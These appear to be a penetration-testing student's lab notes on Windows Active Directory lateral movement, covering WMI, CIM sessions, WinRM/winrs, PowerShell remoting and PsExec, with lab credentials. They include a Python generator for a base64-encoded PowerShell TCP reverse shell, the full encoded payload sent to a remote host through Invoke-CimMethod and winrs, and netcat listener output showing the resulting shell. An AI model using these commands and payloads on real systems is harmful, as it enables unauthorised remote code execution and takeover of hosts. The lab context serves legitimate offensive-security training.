Password cracking takes time and may fail.
Kerberos and NTLM do not use the clear text password directly, and native tools from Microsoft do not support authentication using the password hash.

## WMI and WinRM

### WMI
*Windows Management Instrumentation*
- An object-oriented feature that facilitates task automation
- Capable of creating processes via the _Create_ method from the _Win32_Process_ class
- Communicates through [_Remote Procedure Calls_](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page) (RPC) over port 135 for remote access and uses a higher-range port (19152-65535) for session data

>Historically, wmic has been abused for lateral movement via the command line by specifying the target IP after the **/node:** argument then the user and password after the **/user:**  **/password:** arguments

Will need need the credentials of a member of the _Administrators_ local group (which can also be a domain user)

##### Scenario:

- Will instruct **wmic** to open the calculator
	- Opening calc is typically used for PoCs & testing
- Will attack the Files04 server

- RDP in as `jeff` to Client74
- Launch `calc` app on Files04 under `jen`
```powershell
wmic /node:192.168.200.73 /user:jen /password:Nexus123! process call create "calc"
	Executing (Win32_Process)->Create()
	Method execution successful.
	Out Parameters:
	instance of __PARAMETERS
	{
	        ProcessId = 3680;
	        ReturnValue = 0;
	};
```
	- ReturnValue 0 - Process was created successfully.
	- Process *win32calc.exe* would now appear on that machine w/in the Task Manager

>System processes and services always run in session [0](https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361) as part of session isolation, which was introduced in Windows Vista. Because the WMI Provider Host is running as a system service, the newly created processes through WMI are also spawned in session 0.


As **wmic** has been deprecated, it's important to know how to carry this off w/in PS:
- Need to create a PSCredentialObject which stores the session user & pw
	- Store the uname & pw as variables
	- Secure the pw via `ConvertTo-SecureString` cmdlet
	- Create a `PSCredentialObject` w/ the stored uname & secured pw.

```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```

- Need to create a *Common Information Model* (CIM) via the **New-CimSession** cmdlet.
	- Specify DCOM as the protocol for the WMI session
	- Create the new session, **New-Cimsession** against our target IP & supply the cred variable
	- Define 'calc' as the payload to be executed
```powershell
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options 
$command = 'calc';
```

- Tie together all the arguments we configured previously by issuing the _Invoke-CimMethod_ cmdlet and supplying **Win32_Process** to the _ClassName_ and **Create** to the _MethodName_
	- Send the argument, we wrap them in **@{CommandLine =$Command}**.
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```


- Putting it all together, once RDP'd into Client74 via `jeff`, send the full PS commands
```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName 192.168.200.73 -Credential $credential -SessionOption $options
$command = 'calc'
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
	ProcessId ReturnValue PSComputerName
	--------- ----------- --------------
	      908           0 192.168.200.73
```

- Python script for an encoded reverse shell in powershell
```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

- Corrected PS commands
```powershell
$command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAA1ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
	ProcessId ReturnValue PSComputerName
	--------- ----------- --------------
	     1280           0 192.168.200.73
```

- Result in Kali's nc listener
```bash
sudo nc -nlvp 443      
	[sudo] password for kali: 
	listening on [any] 443 ...
	connect to [192.168.45.245] from (UNKNOWN) [192.168.200.73] 56931
	hostname
		FILES04
	PS C:\Windows\system32> whoami
		corp\jen
```


### WinRM
Microsoft version of the WS-Management protocol
- Exchanges XML messages over HTTP and HTTPS
- Uses TCP port 5986 for encrypted HTTPS traffic and port 5985 for plain HTTP.
- Implemented in numerous built-is utilities
	- Ex:  **winrs**

> For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.
> Only works for domain users

##### CmdLine & Revshell

```powershell
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
	FILES04
	corp\jen
```
	- -r - Target host
	- -u - uname
	- -p - pw
	- List of commands we want utilized

- Can replace with encoded revshell from earlier
```powershell
winrs -r:files04 -u:jen -p:Nexus123! "cmd /c powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAA1ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
	#< CLIXML
```

> Careful!  Won't return domain info....
```powershell
net group /domain
	The request will be processed at a domain controller for domain corp.com.
```

##### PowerShell Remoting

- Set up variables as before.  Will only need `$credential`
```powershell
New-PSSession -ComputerName 192.168.200.73 -Credential $credential
	 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
	 -- ----            ------------    ------------    -----         -----------------     ------------
	  1 WinRM1          192.168.200.73  RemoteMachine   Opened        Microsoft.PowerShell     Available

Enter-PSSession 1
	[192.168.200.73]: PS C:\Users\jen\Documents> whoami
		corp\jen
	[192.168.200.73]: PS C:\Users\jen\Documents> ipconfig
		Windows IP Configuration
		Ethernet adapter Ethernet0:
		
		   Connection-specific DNS Suffix  . :
		   Link-local IPv6 Address . . . . . : fe80::c4de:857:a395:9cec%9
		   IPv4 Address. . . . . . . . . . . : 192.168.200.73
		   Subnet Mask . . . . . . . . . . . : 255.255.255.0
		   Default Gateway . . . . . . . . . : 192.168.200.254
	[192.168.200.73]: PS C:\Users\jen\Documents> net user /domain
		The request will be processed at a domain controller for domain corp.com.
		
		net : System error 5 has occurred.
		    + CategoryInfo          : NotSpecified: (System error 5 has occurred.:String) [], RemoteException
		    + FullyQualifiedErrorId : NativeCommandError
		
		Access is denied.
```


## psexec
- Replacement for telnet-like applications and provide remote execution of processes on other systems through an interactive console
- Part of the SysInternals suite
	- Not installed by default, but easily transferable
- Can be misused for lateral movement
	- User authenticating to target must be part of Admins local group
	- ADMIN$ share must be available                         -> Default on Win Server
	- File and Printer Sharing must be turned on         -> Default on Win Server


To execute the command remotely, PsExec performs the following tasks:
- Writes **psexesvc.exe** into the **C:\Windows** directory
- Creates and spawns a service on the remote host
- Runs the requested program/command as a child process of **psexesvc.exe**

##### Scenario

- RDP access as local Admin user `offsec` on client74
```bash
xfreerdp /cert-ignore /u:offsec /p:lab /v:192.168.220.74
```
	- NOTE: no `/d` flag is used as it's the local Admin user, not a domain user.

- Invoke an interactive (`-i`) session on the remote host
```powershell
powershell.exe
cd C:\Tools\SysinternalsSuite

.\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
	PsExec v2.4 - Execute processes remotely
	Copyright (C) 2001-2022 Mark Russinovich
	Sysinternals - www.sysinternals.com

	Microsoft Windows [Version 10.0.20348.169]
	(c) Microsoft Corporation. All rights reserved.
	
	C:\Windows\system32>hostname
		FILES04
	
	C:\Windows\system32>whoami
		corp\jen
```


## AD Pass-The-Hash

